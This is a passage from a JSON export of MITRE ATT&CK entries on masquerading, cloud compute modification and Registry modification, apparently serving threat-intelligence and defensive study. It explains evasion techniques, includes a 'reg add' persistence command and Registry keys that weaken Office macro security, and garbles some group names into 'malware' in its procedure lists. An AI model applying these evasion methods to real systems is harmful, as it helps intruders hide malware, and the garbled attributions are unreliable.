                        "Description": "The <name> main executable has disguised itself as Microsoft\u2019s Narrator.[88]"
                    },
                    "S1011": {
                        "ID": "S1011",
                        "Name": "Tarrask",
                        "Description": "<name> has masqueraded as executable files such as winupdate.exe, date.exe, or win.exe.[175]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has replaced .dockerd and .dockerenv with their own scripts and cryptocurrency mining software.[176]"
                    },
                    "S0560": {
                        "ID": "S0560",
                        "Name": "TEARDROP",
                        "Description": "<name> files had names that resembled legitimate Window file and directory names.[177][144]"
                    },
                    "S0595": {
                        "ID": "S0595",
                        "Name": "ThiefQuest",
                        "Description": "<name> prepends a copy of itself to the beginning of an executable file while maintaining the name of the executable.[178][179]"
                    },
                    "S0665": {
                        "ID": "S0665",
                        "Name": "ThreatNeedle",
                        "Description": "<name> chooses its payload creation path from a randomly selected service name from netsvc.[180]"
                    },
                    "S0668": {
                        "ID": "S0668",
                        "Name": "TinyTurla",
                        "Description": "<name> has been deployed as w64time.dll to appear legitimate.[181]"
                    },
                    "G1022": {
                        "ID": "G1022",
                        "Name": "ToddyCat",
                        "Description": "<name> has used the name debug.exe for malware components.[155]"
                    },
                    "G0134": {
                        "ID": "G0134",
                        "Name": "Transparent Tribe",
                        "Description": "<name> can mimic legitimate Windows directories by using the same icons and names.[182]"
                    },
                    "C0030": {
                        "ID": "C0030",
                        "Name": "Triton Safety Instrumented System Attack",
                        "Description": "In the <name>, TEMP.Veles renamed files to look like legitimate files, such as Windows update files or Schneider Electric application files."
                    },
                    "G0081": {
                        "ID": "G0081",
                        "Name": "Tropic Trooper",
                        "Description": "<name> has hidden payloads in Flash directories and fake installer files.[183]"
                    },
                    "S0386": {
                        "ID": "S0386",
                        "Name": "Ursnif",
                        "Description": "<name> has used strings from legitimate system files and existing folders for its file, folder, and Registry entry names.[184]"
                    },
                    "S0136": {
                        "ID": "S0136",
                        "Name": "USBStealer",
                        "Description": "<name> mimics a legitimate Russian program called USB Disk Security.[185]"
                    },
                    "G1017": {
                        "ID": "G1017",
                        "Name": "Volt Typhoon",
                        "Description": "<name> has used legitimate looking filenames for compressed copies of the ntds.dit database and used names including cisco_up.exe, cl64.exe, vm3dservice.exe, watchdogd.exe, Win.exe, WmiPreSV.exe, and WmiPrvSE.exe for the Earthworm and Fast Reverse Proxy tools.[186][187]"
                    },
                    "G0107": {
                        "ID": "G0107",
                        "Name": "Whitefly",
                        "Description": "<name> has named the malicious DLL the same name as DLLs belonging to legitimate software from various security vendors.[188]"
                    },
                    "S0141": {
                        "ID": "S0141",
                        "Name": "Winnti for Windows",
                        "Description": "A <name> implant file was named ASPNET_FILTER.DLL, mimicking the legitimate ASP.NET ISAPI filter DLL with the same name.[189]"
                    },
                    "G0090": {
                        "ID": "G0090",
                        "Name": "WIRTE",
                        "Description": "<name> has named a first stage dropper Kaspersky Update Agent in order to appear legitimate.[190]"
                    },
                    "S0086": {
                        "ID": "S0086",
                        "Name": "ZLib",
                        "Description": "<name> mimics the resource version information of legitimate Realtek Semiconductor, Nvidia, or Synaptics modules.[104]"
                    }
                }
            },
            "006": {
                "name": "Space after Filename",
                "href": "/techniques/T1036/006",
                "description": "Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.For example, if there is a Mach-O executable file called evil.bin, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to evil.txt, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to evil.txt  (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed [1].Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.",
                "Procedure": {
                    "S0276": {
                        "ID": "S0276",
                        "Name": "Keydnap",
                        "Description": "<name> puts a space after a false .jpg extension so that execution actually goes through the Terminal.app program.[2]"
                    }
                }
            },
            "007": {
                "name": "Double File Extension",
                "href": "/techniques/T1036/007",
                "description": "Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: File.txt.exe may render in some views as just File.txt). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system\u2019s policies.[1][2] Adversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain Initial Access into a user\u2019s system via Spearphishing Attachment then User Execution. For example, an executable file attachment named Evil.txt.exe may display as Evil.txt to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.[2]Common file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.",
                "Procedure": {
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "The <name> loader has used dual-extension executable files such as PreviewReport.DOC.exe.[3]"
                    },
                    "S1111": {
                        "ID": "S1111",
                        "Name": "DarkGate",
                        "Description": "<name> masquerades malicious LNK files as PDF objects using the double extension .pdf.lnk.[4]"
                    },
                    "S1015": {
                        "ID": "S1015",
                        "Name": "Milan",
                        "Description": "<name> has used an executable named companycatalog.exe.config to appear benign.[5]"
                    },
                    "G0129": {
                        "ID": "G0129",
                        "Name": "Mustang Panda",
                        "Description": "<name> has used an additional filename extension to hide the true file type.[6][7]"
                    }
                }
            },
            "008": {
                "name": "Masquerade File Type",
                "href": "/techniques/T1036/008",
                "description": "Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the file\u2019s signature, extension, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a file\u2019s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the file\u2019s type. For example, the header of a JPEG file,  is  0xFF 0xD8 and the file extension is either .JPE, .JPEG or .JPG. Adversaries may edit the header\u2019s hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanitization. This behavior is commonly used when payload files are transferred (e.g., Ingress Tool Transfer) and stored (e.g., Upload Malware) so that adversaries may move their malware without triggering detections. Common non-executable file types and extensions, such as text files (.txt) and image files (.jpg, .gif, etc.) may be typically treated as benign.  Based on this, adversaries may use a file extension to disguise malware, such as naming a PHP backdoor code with a file name of test.gif. A user may not know that a file is malicious due to the benign appearance and file extension.Polygot files, which are files that have multiple different file types and that function differently based on the application that will execute them, may also be used to disguise malicious malware and capabilities.[1]",
                "Procedure": {
                    "C0025": {
                        "ID": "C0025",
                        "Name": "2016 Ukraine Electric Power Attack",
                        "Description": "During the <name>, Sandworm Team masqueraded executables as .txt files.[2]"
                    },
                    "S1074": {
                        "ID": "S1074",
                        "Name": "ANDROMEDA",
                        "Description": "<name> has been delivered through a LNK file disguised as a folder.[3]"
                    },
                    "S1053": {
                        "ID": "S1053",
                        "Name": "AvosLocker",
                        "Description": "<name> has been disguised as a .jpg file.[4]"
                    },
                    "S1063": {
                        "ID": "S1063",
                        "Name": "Brute Ratel C4",
                        "Description": "<name> has used Microsoft Word icons to hide malicious LNK files.[5]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group disguised malicious template files as JPEG files to avoid detection.[6][7]"
                    },
                    "S0352": {
                        "ID": "S0352",
                        "Name": "OSX_OCEANLOTUS.D",
                        "Description": "<name> has disguised it's true file structure as an application bundle by adding special characters to the filename and using the icon for legitimate Word documents.[8]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "The <name> payload has been disguised as a PNG file and hidden within LNK files using a Microsoft File Explorer icon.[9][10]"
                    },
                    "G1017": {
                        "ID": "G1017",
                        "Name": "Volt Typhoon",
                        "Description": "<name> has appended copies of the ntds.dit database with a .gif file extension.[11]"
                    }
                }
            },
            "009": {
                "name": "Break Process Trees",
                "href": "/techniques/T1036/009",
                "description": "An adversary may attempt to evade process tree-based analysis by modifying executed malware's parent process ID (PPID). If endpoint protection software leverages the \"parent-child\" relationship for detection, breaking this relationship could result in the adversary\u2019s behavior not being associated with previous process tree activity. On Unix-based systems breaking this process tree is common practice for administrators to execute software using scripts and programs.[1] On Linux systems, adversaries may execute a series of Native API calls to alter malware's process tree. For example, adversaries can execute their payload without any arguments, call the fork() API call twice, then have the parent process exit. This creates a grandchild process with no parent process that is immediately adopted by the init system process (PID 1), which successfully disconnects the execution of the adversary's payload from its previous process tree.Another example is using the \"daemon\" syscall to detach from the current parent process and run in the background.[2][3]",
                "Procedure": {}
            }
        },
        "tactic": "Defense Evasion",
        "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.Renaming abusable system utilities to evade security monitoring is also a form of Masquerading.[1]",
        "Procedure": {
            "S0622": {
                "ID": "S0622",
                "Name": "AppleSeed",
                "Description": "malware can disguise JavaScript files as PDFs.[2]"
            },
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware has renamed the WinRAR utility to avoid detection.[3]"
            },
            "G0050": {
                "ID": "G0050",
                "Name": "APT32",
                "Description": "malware has disguised a Cobalt Strike beacon as a Flash Installer.[4]"
            },
            "S0268": {
                "ID": "S0268",
                "Name": "Bisonal",
                "Description": "malware dropped a decoy payload with a .jpg extension that contained a malicious Visual Basic script.[5]"
            },
            "S0635": {
                "ID": "S0635",
                "Name": "BoomBox",
                "Description": "malware has the ability to mask malicious data strings as PDF files.[6]"
            },
            "G0060": {
                "ID": "G0060",
                "Name": "BRONZE BUTLER",
                "Description": "malware has masked executables with document file icons including Word and Adobe PDF.[7]"
            },
            "C0015": {
                "ID": "C0015",
                "Name": "C0015",
                "Description": "During malware, the threat actors named a binary file compareForfor.jpg to disguise it as a JPG file.[8]"
            },
            "C0018": {
                "ID": "C0018",
                "Name": "C0018",
                "Description": "During malware, AvosLocker was disguised using the victim company name as the filename.[9]"
            },
            "S0497": {
                "ID": "S0497",
                "Name": "Dacls",
                "Description": "The malware Mach-O binary has been disguised as a .nib file.[10]"
            },
            "S1111": {
                "ID": "S1111",
                "Name": "DarkGate",
                "Description": "malware can masquerade as pirated media content for initial delivery to victims.[11]"
            },
            "S1066": {
                "ID": "S1066",
                "Name": "DarkTortilla",
                "Description": "malware's payload has been renamed PowerShellInfo.exe.[12]"
            },
            "S0673": {
                "ID": "S0673",
                "Name": "DarkWatchman",
                "Description": "malware has used an icon mimicking a text file to mask a malicious executable.[13]"
            },
            "G0035": {
                "ID": "G0035",
                "Name": "Dragonfly",
                "Description": "malware has created accounts disguised as legitimate backup and service accounts as well as an email administration account.[14]"
            },
            "S0634": {
                "ID": "S0634",
                "Name": "EnvyScout",
                "Description": "malware has used folder icons for malicious files to lure victims into opening them.[6]"
            },
            "S0512": {
                "ID": "S0512",
                "Name": "FatDuke",
                "Description": "malware has attempted to mimic a compromised user's traffic by using the same user agent as the installed browser.[15]"
            },
            "G1016": {
                "ID": "G1016",
                "Name": "FIN13",
                "Description": "malware has masqueraded staged data by using the Windows certutil utility to generate fake Base64 encoded certificates with the input file.[16][17]"
            },
            "S0696": {
                "ID": "S0696",
                "Name": "Flagpro",
                "Description": "malware can download malicious files with a .tmp extension and append them with .exe prior to execution.[18]"
            },
            "S0661": {
                "ID": "S0661",
                "Name": "FoggyWeb",
                "Description": "malware can masquerade the output of C2 commands as a fake, but legitimately formatted WebP file.[19]"
            },
            "G0140": {
                "ID": "G0140",
                "Name": "LazyScripter",
                "Description": "malware has used several different security software icons to disguise executables.[20]"
            },
            "G0045": {
                "ID": "G0045",
                "Name": "menuPass",
                "Description": "malware has used esentutl to change file extensions to their true type that were masquerading as .txt files.[21]"
            },
            "S1015": {
                "ID": "S1015",
                "Name": "Milan",
                "Description": "malware has used an executable named companycatalogue to appear benign.[22]"
            },
            "S0637": {
                "ID": "S0637",
                "Name": "NativeZone",
                "Description": "malware has, upon execution, displayed a message box that appears to be related to a Ukrainian electronic document management system.[23]"
            },
            "G0133": {
                "ID": "G0133",
                "Name": "Nomadic Octopus",
                "Description": "malware attempted to make Octopus appear as a  Telegram Messenger with a Russian interface.[24]"
            },
            "S0368": {
                "ID": "S0368",
                "Name": "NotPetya",
                "Description": "malware drops PsExec with the filename dllhost.dat.[25]"
            },
            "G0049": {
                "ID": "G0049",
                "Name": "OilRig",
                "Description": "malware has used .doc file extensions to mask malicious executables.[26]"
            },
            "C0016": {
                "ID": "C0016",
                "Name": "Operation Dust Storm",
                "Description": "For malware, the threat actors disguised some executables as JPG files.[27]"
            },
            "C0006": {
                "ID": "C0006",
                "Name": "Operation Honeybee",
                "Description": "During malware, the threat actors modified the MaoCheng dropper so its icon appeared as a Word document.[28]"
            },
            "G0068": {
                "ID": "G0068",
                "Name": "PLATINUM",
                "Description": "malware has renamed rar.exe to avoid detection.[29]"
            },
            "S1046": {
                "ID": "S1046",
                "Name": "PowGoop",
                "Description": "malware has disguised a PowerShell script as a .dat file (goopdate.dat).[30]"
            },
            "S0565": {
                "ID": "S0565",
                "Name": "Raindrop",
                "Description": "malware was built to include a modified version of 7-Zip source code (including associated export names) and Far Manager source code.[31][32]"
            },
            "S0458": {
                "ID": "S0458",
                "Name": "Ramsay",
                "Description": "malware has masqueraded as a JPG image file.[33]"
            },
            "S0662": {
                "ID": "S0662",
                "Name": "RCSession",
                "Description": "malware has used a file named English.rtf to appear benign on victim hosts.[34][35]"
            },
            "S0148": {
                "ID": "S0148",
                "Name": "RTM",
                "Description": "malware has been delivered as archived Windows executable files masquerading as PDF documents.[36]"
            },
            "S0446": {
                "ID": "S0446",
                "Name": "Ryuk",
                "Description": "malware can create .dll files that actually contain a Rich Text File format document.[37]"
            },
            "S1018": {
                "ID": "S1018",
                "Name": "Saint Bot",
                "Description": "malware has renamed malicious binaries as wallpaper.mp4 and slideshow.mp4 to avoid detection.[38][39]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware masqueraded malicious installers as Windows update packages to evade defense and entice users to execute binaries.[40]"
            },
            "S0615": {
                "ID": "S0615",
                "Name": "SombRAT",
                "Description": "malware can use a legitimate process name to hide itself.[41]"
            },
            "G0127": {
                "ID": "G0127",
                "Name": "TA551",
                "Description": "malware has masked malware DLLs as dat and jpg files.[42]"
            },
            "G0139": {
                "ID": "G0139",
                "Name": "TeamTNT",
                "Description": "malware has disguised their scripts with docker-related file names.[43]"
            },
            "S0682": {
                "ID": "S0682",
                "Name": "TrailBlazer",
                "Description": "malware has used filenames that match the name of the compromised system in attempt to avoid detection.[44]"
            },
            "S0266": {
                "ID": "S0266",
                "Name": "TrickBot",
                "Description": "The malware downloader has used an icon to appear as a Microsoft Word document.[45]"
            },
            "S0689": {
                "ID": "S0689",
                "Name": "WhisperGate",
                "Description": "malware has been disguised as a JPG extension to avoid detection as a malicious PE file.[46]"
            },
            "G0112": {
                "ID": "G0112",
                "Name": "Windshift",
                "Description": "malware has used icons mimicking MS Office files to mask malicious executables.[47] malware has also attempted to hide executables by changing the file extension to \".scr\" to mimic Windows screensavers.[48]"
            },
            "S0466": {
                "ID": "S0466",
                "Name": "WindTail",
                "Description": "malware has used icons mimicking MS Office files to mask payloads.[47]"
            },
            "S0658": {
                "ID": "S0658",
                "Name": "XCSSET",
                "Description": "malware builds a malicious application bundle to resemble Safari through using the Safari icon and Info.plist. [49]"
            },
            "G0128": {
                "ID": "G0128",
                "Name": "ZIRCONIUM",
                "Description": "malware has spoofed legitimate applications in phishing lures and changed file extensions to conceal  installation of malware.[50][51]"
            }
        }
    },
    "T1578": {
        "ttp_name": "Modify Cloud Compute Infrastructure",
        "ttp_id": "T1578",
        "href": "/techniques/T1578",
        "subtechnique": {
            "001": {
                "name": "Create Snapshot",
                "href": "/techniques/T1578/001",
                "description": "An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in Revert Cloud Instance where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.An adversary may Create Cloud Instance, mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.[1]",
                "Procedure": {
                    "S1091": {
                        "ID": "S1091",
                        "Name": "Pacu",
                        "Description": "<name> can create snapshots of EBS volumes and RDS instances.[2]"
                    }
                }
            },
            "002": {
                "name": "Create Cloud Instance",
                "href": "/techniques/T1578/002",
                "description": "An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may Create Snapshot of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect Data from Local System or for Remote Data Staging.[1]Creating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.",
                "Procedure": {
                    "C0027": {
                        "ID": "C0027",
                        "Name": "C0027",
                        "Description": "During <name>, Scattered Spider used access to the victim's Azure tenant to create Azure VMs.[2]"
                    },
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> has created new virtual machines within the target's cloud environment after leveraging credential access to cloud assets.[3]"
                    },
                    "G1015": {
                        "ID": "G1015",
                        "Name": "Scattered Spider",
                        "Description": "During C0027, <name> used access to the victim's Azure tenant to create Azure VMs.[2]<name> has also created Amazon EC2 instances within the victim's environment.[4]"
                    }
                }
            },
            "003": {
                "name": "Delete Cloud Instance",
                "href": "/techniques/T1578/003",
                "description": "An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence.  Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.An adversary may also Create Cloud Instance and later terminate the instance after achieving their objectives.[1]",
                "Procedure": {
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> has deleted the target's systems and resources in the cloud to trigger the organization's incident and crisis response process.[2]"
                    }
                }
            },
            "004": {
                "name": "Revert Cloud Instance",
                "href": "/techniques/T1578/004",
                "description": "An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.[1][2]",
                "Procedure": {}
            },
            "005": {
                "name": "Modify Cloud Compute Configurations",
                "href": "/techniques/T1578/005",
                "description": "Adversaries may modify settings that directly affect the size, locations, and resources available to cloud compute infrastructure in order to evade defenses. These settings may include service quotas, subscription associations, tenant-wide policies, or other configurations that impact available compute. Such modifications may allow adversaries to abuse the victim\u2019s compute resources to achieve their goals, potentially without affecting the execution of running instances and/or revealing their activities to the victim.For example, cloud providers often limit customer usage of compute resources via quotas. Customers may request adjustments to these quotas to support increased computing needs, though these adjustments may require approval from the cloud provider. Adversaries who compromise a cloud environment may similarly request quota adjustments in order to support their activities, such as enabling additional Resource Hijacking without raising suspicion by using up a victim\u2019s entire quota.[1] Adversaries may also increase allowed resource usage by modifying any tenant-wide policies that limit the sizes of deployed virtual machines.[2]Adversaries may also modify settings that affect where cloud resources can be deployed, such as enabling Unused/Unsupported Cloud Regions. In Azure environments, an adversary who has gained access to a Global Administrator account may create new subscriptions in which to deploy resources, or engage in subscription hijacking by transferring an existing pay-as-you-go subscription from a victim tenant to an adversary-controlled tenant.[3] This will allow the adversary to use the victim\u2019s compute resources without generating logs on the victim tenant.[2] [4]",
                "Procedure": {}
            }
        },
        "tactic": "Defense Evasion",
        "description": "An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.Permissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.[1]",
        "Procedure": {}
    },
    "T1112": {
        "ttp_name": "Modify Registry",
        "ttp_id": "T1112",
        "href": "/techniques/T1112",
        "tactic": "Defense Evasion",
        "description": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.Access to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification. [1] Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API. [2] Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. [3] [4]The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. [5] Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
        "Procedure": {
            "C0028": {
                "ID": "C0028",
                "Name": "2015 Ukraine Electric Power Attack",
                "Description": "During the malware, Sandworm Team modified in-registry Internet settings to lower internet security before launching rundll32.exe, which in-turn launches the malware and communicates with C2 servers over the Internet. [6]."
            },
            "S0677": {
                "ID": "S0677",
                "Name": "AADInternals",
                "Description": "malware can modify registry keys as part of setting a new pass-through authentication agent.[7]"
            },
            "S0045": {
                "ID": "S0045",
                "Name": "ADVSTORESHELL",
                "Description": "malware is capable of setting and deleting Registry values.[8]"
            },
            "S0331": {
                "ID": "S0331",
                "Name": "Agent Tesla",
                "Description": "malware can achieve persistence by modifying Registry key entries.[9]"
            },
            "S1025": {
                "ID": "S1025",
                "Name": "Amadey",
                "Description": "malware has overwritten registry keys for persistence.[10]"
            },
            "G0073": {
                "ID": "G0073",
                "Name": "APT19",
                "Description": "malware uses a Port 22 malware variant to modify several Registry keys.[11]"
            },
            "G0050": {
                "ID": "G0050",
                "Name": "APT32",
                "Description": "malware's backdoor has modified the Windows Registry to store the backdoor's configuration. [12]"
            },
            "G0082": {
                "ID": "G0082",
                "Name": "APT38",
                "Description": "malware uses a tool called CLEANTOAD that has the capability to modify Registry keys.[13]"
            },
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware used a malware variant called GOODLUCK to modify the registry in order to steal credentials.[14][15]"
            },
            "S0438": {
                "ID": "S0438",
                "Name": "Attor",
                "Description": "malware's dispatcher can modify the Run registry key.[16]"
            },
            "S0640": {
                "ID": "S0640",
                "Name": "Avaddon",
                "Description": "malware modifies several registry keys for persistence and UAC bypass.[17]"
            },
            "S0031": {
                "ID": "S0031",
                "Name": "BACKSPACE",
                "Description": "malware is capable of deleting Registry keys, sub-keys, and values on a victim system.[18]"
            },
            "S0245": {
                "ID": "S0245",
                "Name": "BADCALL",
                "Description": "malware modifies the firewall Registry key SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfileGloballyOpenPorts\\List.[19]"
            },
            "S0239": {
                "ID": "S0239",
                "Name": "Bankshot",
                "Description": "malware writes data into the Registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Pniumj.[20]"
            },
            "S0268": {
                "ID": "S0268",
                "Name": "Bisonal",
                "Description": "malware has deleted Registry keys to clean up its prior activity.[21]"
            },
            "S0570": {
                "ID": "S0570",
                "Name": "BitPaymer",
                "Description": "malware can set values in the Registry to help in execution.[22]"
            },
            "S1070": {
                "ID": "S1070",
                "Name": "Black Basta",
                "Description": "malware can modify the Registry to enable itself to run in safe mode and to modify the icons and file extensions for encrypted files.[23][24][25][26][27][28]"
            },
            "S1068": {
                "ID": "S1068",
                "Name": "BlackCat",
                "Description": "malware has the ability to add the following registry key on compromised networks to maintain persistence: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services \\LanmanServer\\Paramenters[29]"
            },
            "G0108": {
                "ID": "G0108",
                "Name": "Blue Mockingbird",
                "Description": "malware has used Windows Registry modifications to specify a DLL payload.[30]"
            },
            "S0348": {
                "ID": "S0348",
                "Name": "Cardinal RAT",
                "Description": "malware sets HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load to point to its executable.[31]"
            },
            "S0261": {
                "ID": "S0261",
                "Name": "Catchamas",
                "Description": "malware creates three Registry keys to establish persistence by adding a Windows Service.[32]"
            },
            "S0572": {
                "ID": "S0572",
                "Name": "Caterpillar WebShell",
                "Description": "malware has a command to modify a Registry key.[33]"
            },
            "S0631": {
                "ID": "S0631",
                "Name": "Chaes",
                "Description": "malware can modify Registry values to stored information and establish persistence.[34]"
            },
            "S0674": {
                "ID": "S0674",
                "Name": "CharmPower",
                "Description": "malware can remove persistence-related artifacts from the Registry.[35]"
            },
            "S0023": {
                "ID": "S0023",
                "Name": "CHOPSTICK",
                "Description": "malware may modify Registry keys to store RC4 encrypted configuration information.[36]"
            },
            "S0660": {
                "ID": "S0660",
                "Name": "Clambling",
                "Description": "malware can set and delete Registry keys.[37]"
            },
            "S0611": {
                "ID": "S0611",
                "Name": "Clop",
                "Description": "malware can make modifications to Registry keys.[38]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "malware can modify Registry values within HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\\Excel\\Security\\AccessVBOM\\ to enable the execution of additional code.[39]"
            },
            "S0126": {
                "ID": "S0126",
                "Name": "ComRAT",
                "Description": "malware has modified Registry values to store encrypted orchestrator code and payloads.[40][41]"
            },
            "S0608": {
                "ID": "S0608",
                "Name": "Conficker",
                "Description": "malware adds keys to the Registry at HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services and various other Registry locations.[42][43]"
            },
            "S0488": {
                "ID": "S0488",
                "Name": "CrackMapExec",
                "Description": "malware can create a registry key using wdigest.[44]"
            },
            "S0115": {
                "ID": "S0115",
                "Name": "Crimson",
                "Description": "malware can set a Registry key to determine how long it has been installed and possibly to indicate the version number.[45]"
            },
            "S0527": {
                "ID": "S0527",
                "Name": "CSPY Downloader",
                "Description": "malware can write to the Registry under the %windir% variable to execute tasks.[46]"
            },
            "S0334": {
                "ID": "S0334",
                "Name": "DarkComet",
                "Description": "malware adds a Registry value for its installation routine to the Registry Key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System Enable LUA=\"0\" and HKEY_CURRENT_USER\\Software\\DC3_FEXEC.[47][48]"
            },
            "S1066": {
                "ID": "S1066",
                "Name": "DarkTortilla",
                "Description": "malware has modified registry keys for persistence.[49]"
            },
            "S0673": {
                "ID": "S0673",
                "Name": "DarkWatchman",
                "Description": "malware can modify Registry values to store configuration strings, keylogger, and output of components.[50]"
            },
            "S1033": {
                "ID": "S1033",
                "Name": "DCSrv",
                "Description": "malware has created Registry keys for persistence.[51]"
            },
            "G0035": {
                "ID": "G0035",
                "Name": "Dragonfly",
                "Description": "malware has modified the Registry to perform multiple techniques through the use of Reg.[52]"
            },
            "G1006": {
                "ID": "G1006",
                "Name": "Earth Lusca",
                "Description": "malware modified the registry using the command reg add \"HKEY_CURRENT_USER\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \"[file path]\" for persistence.[53]"
            },
            "G1003": {
                "ID": "G1003",
                "Name": "Ember Bear",
                "Description": "malware has used an open source batch script to modify Windows Defender registry keys.[54]"
            },
            "S0568": {
                "ID": "S0568",
                "Name": "EVILNUM",
                "Description": "malware can make modifications to the Regsitry for persistence.[55]"
            },
            "S0343": {
                "ID": "S0343",
                "Name": "Exaramel for Windows",
                "Description": "malware adds the configuration to the Registry in XML format.[56]"
            },
            "S0569": {
                "ID": "S0569",
                "Name": "Explosive",
                "Description": "malware has a function to write itself to Registry values.[57]"
            },
            "S0267": {
                "ID": "S0267",
                "Name": "FELIXROOT",
                "Description": "malware deletes the Registry key HKCU\\Software\\Classes\\Applications\\rundll32.exe\\shell\\open.[58]"
            },
            "S0679": {
                "ID": "S0679",
                "Name": "Ferocious",
                "Description": "malware has the ability to add a Class ID in the current user Registry hive to enable persistence mechanisms.[59]"
            },
            "G0061": {
                "ID": "G0061",
                "Name": "FIN8",
                "Description": "malware has deleted Registry keys during post compromise cleanup activities.[60]"
            },
            "G0047": {
                "ID": "G0047",
                "Name": "Gamaredon Group",
                "Description": "malware has removed security settings for VBA macro execution by changing registry values HKCU\\Software\\Microsoft\\Office\\<version>\\<product>\\Security\\VBAWarnings and HKCU\\Software\\Microsoft\\Office\\<version>\\<product>\\Security\\AccessVBOM.[61][62]"
            },
            "S0666": {
                "ID": "S0666",
                "Name": "Gelsemium",
                "Description": "malware can modify the Registry to store its components.[63]"
            },
            "S0032": {
                "ID": "S0032",
                "Name": "gh0st RAT",
                "Description": "malware has altered the InstallTime subkey.[64]"
            },
            "G0078": {
                "ID": "G0078",
                "Name": "Gorgon Group",
                "Description": "malware malware can deactivate security mechanisms in Microsoft Office by editing several keys and values under HKCU\\Software\\Microsoft\\Office\\.[65]"
            },
            "S0531": {
                "ID": "S0531",
                "Name": "Grandoreiro",
                "Description": "malware can modify the Registry to store its configuration at HKCU\\Software\\ under frequently changing names including %USERNAME% and ToolTech-RM.[66]"
            },
            "S0342": {
                "ID": "S0342",
                "Name": "GreyEnergy",
                "Description": "malware modifies conditions in the Registry and adds keys.[67]"
            },
            "S0697": {
                "ID": "S0697",
                "Name": "HermeticWiper",
